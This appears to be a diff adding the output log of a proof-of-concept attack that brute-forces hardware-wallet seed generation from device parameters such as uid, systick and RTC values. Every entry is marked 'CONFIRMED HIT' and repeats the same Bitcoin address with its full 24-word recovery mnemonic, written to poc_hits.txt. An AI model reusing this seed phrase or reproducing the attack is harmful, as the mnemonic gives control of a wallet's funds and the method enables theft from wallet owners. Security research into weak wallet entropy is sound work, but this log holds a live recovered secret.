+  uid      = 0x001a0032
+  systick  = 6530
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0033
+  systick  = 6531
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0034
+  systick  = 6532
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0035
+  systick  = 6533
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0036
+  systick  = 6534
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0037
+  systick  = 6535
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0038
+  systick  = 6536
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0039
+  systick  = 6537
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a003a
+  systick  = 6538
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a003b
+  systick  = 6539
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a003c
+  systick  = 6540
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a003d
+  systick  = 6541
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a003e
+  systick  = 6542
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a003f
+  systick  = 6543
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0040
+  systick  = 6640
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0041
+  systick  = 6641
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0042
+  systick  = 6642
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0043
+  systick  = 6643
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0044
+  systick  = 6644
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0045
+  systick  = 6645
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0046
+  systick  = 6646
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0047
+  systick  = 6647
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001a0048
+  systick  = 6648
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0000
+  systick  = 72112
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0001
+  systick  = 72113
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0002
+  systick  = 72114
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0003
+  systick  = 72115
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0004
+  systick  = 72116
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0005
+  systick  = 72117
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0006
+  systick  = 72118
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0007
+  systick  = 72119
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0008
+  systick  = 72120
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0009
+  systick  = 72121
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b000a
+  systick  = 72122
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b000b
+  systick  = 72123
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b000c
+  systick  = 72124
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b000d
+  systick  = 72125
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b000e
+  systick  = 72126
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b000f
+  systick  = 72127
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0010
+  systick  = 72096
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0011
+  systick  = 72097
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0012
+  systick  = 72098
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0013
+  systick  = 72099
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0014
+  systick  = 72100
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0015
+  systick  = 72101
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0016
+  systick  = 72102
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0017
+  systick  = 72103
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0018
+  systick  = 72104
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0019
+  systick  = 72105
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b001a
+  systick  = 72106
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b001b
+  systick  = 72107
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b001c
+  systick  = 72108
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b001d
+  systick  = 72109
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b001e
+  systick  = 72110
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b001f
+  systick  = 72111
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0020
+  systick  = 72080
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0021
+  systick  = 72081
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0022
+  systick  = 72082
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0023
+  systick  = 72083
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0024
+  systick  = 72084
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0025
+  systick  = 72085
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0026
+  systick  = 72086
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0027
+  systick  = 72087
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0028
+  systick  = 72088
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b0029
+  systick  = 72089
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b002a
+  systick  = 72090
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b002b
+  systick  = 72091
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b002c
+  systick  = 72092
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b002d
+  systick  = 72093
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qykudzaukwv2xarht7s040zr2cjqj2ucm8dp3g0
+  uid      = 0x001b002e
+  systick  = 72094
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = wood bundle convince into what option diesel dutch moral exhibit gown submit sugar body rail open tip ice tennis impulse brown include hope benefit
+  PoC appended -> poc_hits.txt
+
